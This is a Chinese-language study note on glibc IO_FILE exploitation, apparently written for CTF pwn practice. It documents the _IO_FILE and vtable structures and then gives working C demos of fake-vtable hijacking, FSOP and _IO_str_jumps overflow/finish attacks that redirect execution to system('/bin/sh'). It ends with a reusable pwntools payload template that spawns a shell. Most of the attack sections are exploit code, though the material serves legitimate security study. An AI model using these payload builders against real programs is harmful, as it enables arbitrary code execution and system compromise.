- [IO攻击](#io攻击)
  - [基础结构体](#基础结构体)
    - [\_IO\_FILE](#_io_file)
    - [\_IO\_jump\_t](#_io_jump_t)
    - [\_IO\_file\_jumps](#_io_file_jumps)
      - [\_IO\_file\_finish](#_io_file_finish)
      - [\_IO\_file\_overflow](#_io_file_overflow)
      - [\_IO\_file\_underflow](#_io_file_underflow)
      - [\_IO\_default\_uflow](#_io_default_uflow)
      - [\_IO\_default\_pbackfail](#_io_default_pbackfail)
      - [\_IO\_file\_xsputn](#_io_file_xsputn)
      - [\_IO\_file\_xsgetn](#_io_file_xsgetn)
      - [\_IO\_new\_file\_seekoff](#_io_new_file_seekoff)
      - [\_IO\_default\_seekpos](#_io_default_seekpos)
      - [\_IO\_new\_file\_setbuf](#_io_new_file_setbuf)
      - [\_IO\_new\_file\_sync](#_io_new_file_sync)
      - [\_IO\_file\_doallocate](#_io_file_doallocate)
      - [\_IO\_file\_read](#_io_file_read)
      - [\_IO\_new\_file\_write](#_io_new_file_write)
      - [\_IO\_file\_seek](#_io_file_seek)
      - [\_IO\_file\_close](#_io_file_close)
      - [\_IO\_file\_stat](#_io_file_stat)
      - [\_IO\_default\_showmanyc](#_io_default_showmanyc)
      - [\_IO\_default\_imbue](#_io_default_imbue)
    - [\_IO\_FILE\_plus](#_io_file_plus)
  - [伪造 `vtable` 劫持程序流程](#伪造-vtable-劫持程序流程)
  - [FSOP](#fsop)
  - [glibc-2.24 下的 IO\_FILE](#glibc-224-下的-io_file)
    - [\_IO\_strfile](#_io_strfile)
    - [\_IO\_str\_jumps](#_io_str_jumps)
    - [\_IO\_str\_jumps -\> overflow的利用](#_io_str_jumps---overflow的利用)
    - [\_IO\_str\_jumps -\> finish的利用](#_io_str_jumps---finish的利用)
    - [攻击模板](#攻击模板)

# IO攻击

## 基础结构体

### _IO_FILE

```C
struct _IO_FILE // size = 0xD8
{
    int _flags; // 偏移量:0x0 大小:0x4

    char *_IO_read_ptr;    // 偏移量:0x8  大小:0x8
    char *_IO_read_end;    // 偏移量:0x10 大小:0x8
    char *_IO_read_base;   // 偏移量:0x18 大小:0x8
    char *_IO_write_base;  // 偏移量:0x20 大小:0x8
    char *_IO_write_ptr;   // 偏移量:0x28 大小:0x8
    char *_IO_write_end;   // 偏移量:0x30 大小:0x8
    char *_IO_buf_base;    // 偏移量:0x38 大小:0x8
    char *_IO_buf_end;     // 偏移量:0x40 大小:0x8
    char *_IO_save_base;   // 偏移量:0x48 大小:0x8
    char *_IO_backup_base; // 偏移量:0x50 大小:0x8
    char *_IO_save_end;    // 偏移量:0x58 大小:0x8

    struct _IO_marker *_markers; // 偏移量:0x60 大小:0x8

    struct _IO_FILE *_chain; // 偏移量:0x68 大小:0x8

    int _fileno; // 偏移量:0x70 大小:0x4
    int _flags2; // 偏移量:0x74 大小:0x4

    _IO_off_t _old_offset; // 偏移量:0x78 大小:0x8

    unsigned short _cur_column; // 偏移量:0x80 大小:0x2
    signed char _vtable_offset; // 偏移量:0x82 大小:0x1
    char _shortbuf[1];          // 偏移量:0x83 大小:0x1

    _IO_lock_t *_lock;                // 偏移量:0x88 大小:0x8
    _IO_off64_t _offset;              // 偏移量:0x90 大小:0x8
    struct _IO_codecvt *_codecvt;     // 偏移量:0x98 大小:0x8
    struct _IO_wide_data *_wide_data; // 偏移量:0xA0 大小:0x8
    struct _IO_FILE *_freeres_list;   // 偏移量:0xA8 大小:0x8
    void *_freeres_buf;               // 偏移量:0xB0 大小:0x8

    size_t __pad5; // 偏移量:0xB8 大小:0x8
    int _mode;     // 偏移量:0xC0 大小:0x4

    char _unused2[15 * sizeof(int) - 4 * sizeof(void *) - sizeof(size_t)]; // 偏移量:0xC4 大小:0x14
};
```

### _IO_jump_t

```C
// _IO_jump_t大小 : 0xA8
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

### _IO_file_jumps

```C
const struct _IO_jump_t _IO_file_jumps libio_vtable =
    {
        JUMP_INIT_DUMMY,    // 2
        JUMP_INIT(finish, _IO_file_finish),
        JUMP_INIT(overflow, _IO_file_overflow),
        JUMP_INIT(underflow, _IO_file_underflow),
        JUMP_INIT(uflow, _IO_default_uflow),
        JUMP_INIT(pbackfail, _IO_default_pbackfail),
        JUMP_INIT(xsputn, _IO_file_xsputn),
        JUMP_INIT(xsgetn, _IO_file_xsgetn),
        JUMP_INIT(seekoff, _IO_new_file_seekoff),
        JUMP_INIT(seekpos, _IO_default_seekpos),
        JUMP_INIT(setbuf, _IO_new_file_setbuf),
        JUMP_INIT(sync, _IO_new_file_sync),
        JUMP_INIT(doallocate, _IO_file_doallocate),
        JUMP_INIT(read, _IO_file_read),
        JUMP_INIT(write, _IO_new_file_write),
        JUMP_INIT(seek, _IO_file_seek),
        JUMP_INIT(close, _IO_file_close),
        JUMP_INIT(stat, _IO_file_stat),
        JUMP_INIT(showmanyc, _IO_default_showmanyc),
        JUMP_INIT(imbue, _IO_default_imbue)};
```

#### _IO_file_finish

文件结束的操作, 清空所有缓冲区, `close`文件

#### _IO_file_overflow

向硬盘中写入数据

#### _IO_file_underflow

从硬盘中读取数据

#### _IO_default_uflow

调用的`_IO_file_underflow`，通常用于单字符读取操作

#### _IO_default_pbackfail

处理文件流中的回退操作失败的情况

#### _IO_file_xsputn

将数据放入输出缓冲区，如果数据写满则调用`_IO_file_overflow`清空缓冲区,剩下的数据继续调用`_IO_file_xsputn`

#### _IO_file_xsgetn

将数据从缓冲区读出，如果缓冲区数据不够，则调用`_IO_file_underflow`从磁盘读取数据

#### _IO_new_file_seekoff

实现文件里的偏移操作

#### _IO_default_seekpos

实现文件流定位的操作

#### _IO_new_file_setbuf

设置缓冲区，初始化缓冲区

#### _IO_new_file_sync

同步缓冲区和磁盘

#### _IO_file_doallocate

申请并初始化缓冲区

#### _IO_file_read

输入的最终函数, 用于从流中读取数据

#### _IO_new_file_write

输出的最终函数, 用于向流中写入数据

#### _IO_file_seek

调用的`__lseek64`, 在流中进行位置移动

#### _IO_file_close

关闭文件

#### _IO_file_stat

返回文件状态

#### _IO_default_showmanyc

返回-1

#### _IO_default_imbue

什么都没有

### _IO_FILE_plus

```C
struct _IO_FILE_plus // size = 0xE0
{
    FILE file;                       // size = 0xD8
    const struct _IO_jump_t *vtable; // size(*vtable) = 0xA8
};
```

## 伪造 `vtable` 劫持程序流程

__利用版本:__

glibc-2.23及其以下的版本

__原理:__

修改 `_IO_FILE_plus` 的 `vtable` 指针指向 `fake_vtable`

`vtable` 中的函数调用时会把对应的 `_IO_FILE_plus` 指针作为第一个参数传递，因此这里我们把 `sh` 写入 `_IO_FILE_plus` 头部

__攻击:__

根据[\_IO\_FILE\_plus](#_io_file_plus)结构体可以计算出`vtable`指针在`_IO_FILE_plus+0xD8`的位置
在内存中伪造一个`fake_vtable`，然后让`_IO_FILE_plus->vtable=&fake_vtable`
`fake_vtable`中设置函数指针
修改`_IO_FILE_plus`头为`/bin/sh`值

__示例:__

```C
// glibc-2.23.so
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>

int main()
{
    u64 fake_vtable = MALLOC(0x100);

    SET_ADDR_VALUE(stdout, BINSH);                      // 设置stdout的_IO_FILE的前八个字节为/bin/sh值
    SET_ADDR_OFFSET_VALUE(stdout, 0xD8, fake_vtable);   // 设置stdout的value为fake_vtable
    SET_ADDR_OFFSET_VALUE(fake_vtable, 7 * 8, &system); // 设置fake_vtable的第7个函数指针(__xsputn)为system

    puts(""); // 触发_IO_FILE的__xsputn函数指针，即system("/bin/sh")
    return 0;
}
```

## FSOP

__利用版本:__

glibc-2.23及其以下的版本

__原理:__

`_IO_flush_all_lockp`会刷新所有`FILE`结构体的输出缓冲区，执行这个程序的时候会沿着`fp->chain`执行`overflow`程序, 以下情况会调用`_IO_flush_all_lockp`

- 执行`abort`函数时。(2.27之后不再刷新)
- `__malloc_assert` (仅刷新 stderr ，2.36后不再刷新)
- 执行`exit`函数时。

```C
fp = (_IO_FILE *)_IO_list_all;
while (fp != NULL)
{
    // ...
    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW(fp, EOF) == EOF)
    {

        result = EOF;
    }
    // ...
}
```

可以看出当 `fp->_mode <= 0` 并且 `fp->_IO_write_ptr > fp->_IO_write_base` 时即可执行`vtable`中的`__overflow`

__攻击:__

1. 设置 `fake_IO_FILE` 的 `_mode = 0`, `fp->_IO_write_ptr = 1`, `fp->_IO_write_base = 0`
2. 设置 `fake_IO_FILE` 的 `vtable = fake_vtable`
3. 设置`fake_vtable->__overflow = system`，修改`fake_IO_FILE`头为`/bin/sh`值
4. 也可以设置 `fake_vtable->__overflow = one_gadget` (第四个函数)
5. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
6. `main`返回时或者调用`exit`时即可触发

__示例:__

```C
// glibc-2.23.so
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>

int main()
{
    u64 fake_FILE_vtable = MALLOC(0x100); // fake_IO_FILE_PLUS和fake_vtable

    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0, BINSH);                            // 修改fake_IO_FILE头为/bin/sh值
    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0x20, 0);                             // 设置fake_IO_FILE_PLUS->_IO_write_base=0
    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0x28, 1);                             // 设置fake_IO_FILE_PLUS->_IO_write_ptr=1
    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0xC0, 0);                             // 设置fake_IO_FILE_PLUS->_mode=0
    SET_ADDR_OFFSET_VALUE(fake_FILE_vtable, 0x20 + 0x18, &system);                // 设置fake_vtable->__overflow=system，0x20表示fake_vtable相对于fake_FILE_vtable的偏移，0x18表示__overflow相对于fake_vtable的偏移
    SET_ADDR_OFFSET_VALUE_OFFSET(fake_FILE_vtable, 0xD8, fake_FILE_vtable, 0x20); // 设置fake_IO_FILE_PLUS->vtable=fake_vtable

    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_FILE_vtable); // 设置stderr->chain为fake_FILE_vtable

    return 0; // 触发漏洞
}
```

## glibc-2.24 下的 IO_FILE

__注:__

`_IO_str_jumps` 在 `_IO_file_jumps` 下方

可以检查`glibc`的`_IO_str_jumps->finish`函数中是否含有函数指针来判断是否可用以下的攻击

### _IO_strfile

```C
typedef void *(*_IO_alloc_type) (_IO_size_t);
typedef void (*_IO_free_type) (void*);

struct _IO_streambuf
{
  struct _IO_FILE _f;               // size = 0xD8
  const struct _IO_jump_t *vtable;  // size(*vtable) = 0xA8
};

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;  // 函数指针
  _IO_free_type _free_buffer;       // 函数指针
};

typedef struct _IO_strfile_
{
    struct _IO_streambuf _sbf;      // 0xE0
    struct _IO_str_fields _s;       // 0x10
} _IO_strfile;
```

### _IO_str_jumps

```C
const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,    // 2
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

### _IO_str_jumps -> overflow的利用

__原理:__

将`vtable`设置成`_IO_str_jumps`, 然后利用`_IO_str_overflow` 会调用函数指针 `(char *)(*((_IO_strfile *)fp)->_s._allocate_buffer)(new_size);`

__攻击:__

1. 伪造`fake_IO_FILE`
2. `fake_IO_FILE->_flags = 0`
3. `fake_IO_FILE->_IO_write_ptr = (/bin/sh地址 - 100) / 2 + 1`
4. `fake_IO_FILE->_IO_buf_base = 0`
5. `fake_IO_FILE->_IO_write_base = 0`
6. `fake_IO_FILE->_IO_buf_end = (/bin/sh地址 - 100) / 2`
7. `fake_IO_FILE->_mode = 0`
8. `fake_IO_FILE + 0xD8 = &_IO_str_jumps`(将`vtable`指向`_IO_str_jumps`)
9. `fake_IO_FILE + 0xE0 = &system`
10. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
11. exit时即可触发漏洞

__示例:__

```C
// libc-2.27.so 初代版本
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>

char binsh[] = "/bin/sh";

int main()
{
    u64 str_jumps = GET_VALUE(stdin) - (0x3EBA00 - 0x3E8360);

    u64 fake_IO_FILE = MALLOC(0x100); // fake_IO_FILE_PLUS和fake_vtable

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x0, 0);                                 // fake_IO_FILE->_flags = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x20, 0);                                // fake_IO_FILE->_IO_write_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x28, (GET_VALUE(binsh) - 100) / 2 + 1); // fake_IO_FILE->_IO_write_ptr = (binsh地址 - 100) / 2 + 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x38, 0);                                // fake_IO_FILE->_IO_buf_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x40, (GET_VALUE(binsh) - 100) / 2);     // fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0);                                // fake_IO_FILE->_mode = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, str_jumps);                        // fake_IO_FILE + 0xD8 = &_IO_str_jumps
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xE0, &system);                          // fake_IO_FILE + 0xE0 = &system

    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // 设置stderr->chain为fake_FILE_vtable

    return 0; // 触发漏洞
}
```

### _IO_str_jumps -> finish的利用

__原理:__

在[\_IO\_str\_jumps -\> overflow的利用](#_io_str_jumps---overflow的利用)的基础上，通过进一步修改`vtable`偏移使原本要调用的`overflow`改成`finish`，注意函数指针使用的不是`alloc`而是`free`

```C
void _IO_str_finish(_IO_FILE *fp, int dummy)
{
    if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
        (((_IO_strfile *)fp)->_s._free_buffer)(fp->_IO_buf_base);
    // ...
}
```

__攻击:__

1. 伪造`fake_IO_FILE`
2. `fake_IO_FILE->_flags = 0`
3. `fake_IO_FILE->_IO_write_base = 0`
4. `fake_IO_FILE->_IO_write_ptr = 1`
5. `fake_IO_FILE->_IO_buf_base = /bin/sh`地址
6. `fake_IO_FILE->_mode = 0`
7. `fake_IO_FILE + 0xD8 = &(_IO_str_jumps - 0x8)`(将`vtable`指向`_IO_str_jumps - 8`)
8. `fake_IO_FILE + 0xE8 = system`
9. 修改 `_IO_FILE->_chain` 或者 `_IO_list_all` 为 `fake_IO_FILE`
10. exit时即可触发漏洞

__示例:__

```C
// libc-2.27.so 初代版本
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <demo.h>

char binsh[] = "/bin/sh";

int main()
{
    u64 str_jumps = GET_VALUE(stdin) - (0x3EBA00 - 0x3E8360);

    u64 fake_IO_FILE = MALLOC(0x100); // fake_IO_FILE_PLUS和fake_vtable

    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x0, 0);                           // fake_IO_FILE->_flags = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x20, 0);                          // fake_IO_FILE->_IO_write_base = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x28, 1);                          // fake_IO_FILE->_IO_write_ptr = 1
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0x38, GET_VALUE(binsh));           // fake_IO_FILE->_IO_buf_base = /bin/sh地址
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xC0, 0);                          // fake_IO_FILE->_mode = 0
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xD8, GET_VALUE(str_jumps) - 0x8); // fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
    SET_ADDR_OFFSET_VALUE(fake_IO_FILE, 0xE8, &system);                    // fake_IO_FILE + 0xE8 = system

    SET_ADDR_OFFSET_VALUE(stderr, 0x68, fake_IO_FILE); // 设置stderr->chain为fake_FILE_vtable

    return 0; // 触发漏洞
}
```

### 攻击模板

```python
from pwn import *
from base_data import *

def IOoverflow(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
    '''
        _IO_str_jumps_addr: _IO_str_jumps地址
        fun_addr: 函数地址
        param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
        payload_addr: 内置/bin/sh地址, 只有在param为None时有效
        
        返回: 伪造的_IO_strfile结构体
    '''
    if (param is None and payload_addr is None):
        raise ValueError("必须设置 param 或 payload_addr 参数")

    if param is None:
        # 设置参数
        param = payload_addr + 0x30
        pass
    
    payload = b''
    payload = set_value(payload, 0x0, 0)                            # fake_IO_FILE->_flags = 0
    payload = set_value(payload, 0x20, 0)                           # fake_IO_FILE->_IO_write_base = 0
    payload = set_value(payload, 0x28, int((param - 100) / 2 + 1))  # fake_IO_FILE->_IO_write_ptr = (binsh地址 - 100) / 2 + 1
    payload = set_value(payload, 0x30, BINSH)                       # 内置/bin/sh
    payload = set_value(payload, 0x38, 0)                           # fake_IO_FILE->_IO_buf_base = 0
    payload = set_value(payload, 0x40, int((param - 100) / 2))      # fake_IO_FILE->_IO_buf_end = (binsh地址 - 100) / 2
    payload = set_value(payload, 0xC0, 0)                           # fake_IO_FILE->_mode = 0
    payload = set_value(payload, 0xD8, _IO_str_jumps_addr)          # fake_IO_FILE + 0xD8 = &_IO_str_jumps
    payload = set_value(payload, 0xE0, fun_addr)                    # fake_IO_FILE + 0xE0 = &system
    return payload

def IOfinish(_IO_str_jumps_addr, fun_addr, param = None, payload_addr = None):
    '''
        _IO_str_jumps_addr: _IO_str_jumps地址
        fun_addr: 函数地址
        param: 函数参数, 若param为None, 则使用payload_addr内置/bin/sh
        payload_addr: 内置/bin/sh地址, 只有在param为None时有效
        
        返回: 伪造的_IO_strfile结构体
    '''
    if (param is None and payload_addr is None):
        raise ValueError("必须设置 param 或 payload_addr 参数")

    if param is None:
        # 设置参数
        param = payload_addr + 0x30
        pass
    payload = b''
    payload = set_value(payload, 0x0, 0);                           # fake_IO_FILE->_flags = 0
    payload = set_value(payload, 0x20, 0);                          # fake_IO_FILE->_IO_write_base = 0
    payload = set_value(payload, 0x28, 1);                          # fake_IO_FILE->_IO_write_ptr = 1
    payload = set_value(payload, 0x30, BINSH)                       # 内置/bin/sh
    payload = set_value(payload, 0x38, param);                      # fake_IO_FILE->_IO_buf_base = /bin/sh地址
    payload = set_value(payload, 0xC0, 0);                          # fake_IO_FILE->_mode = 0
    payload = set_value(payload, 0xD8, _IO_str_jumps_addr - 0x8);   # fake_IO_FILE + 0xD8 = &(_IO_str_jumps-0x8)
    payload = set_value(payload, 0xE8, fun_addr);                   # fake_IO_FILE + 0xE8 = system
    return payload


if __name__ == '__main__':
    p = process('./demo')
    
    _IO_str_jumps_addr = int(p.recv(14), 16)
    system_addr = int(p.recv(14), 16)
    binsh_addr = int(p.recv(14), 16)
    
    # p.send(IOoverflow(_IO_str_jumps_addr, system_addr, binsh_addr))
    p.send(IOfinish(_IO_str_jumps_addr, system_addr, binsh_addr))
    
    p.interactive()

```
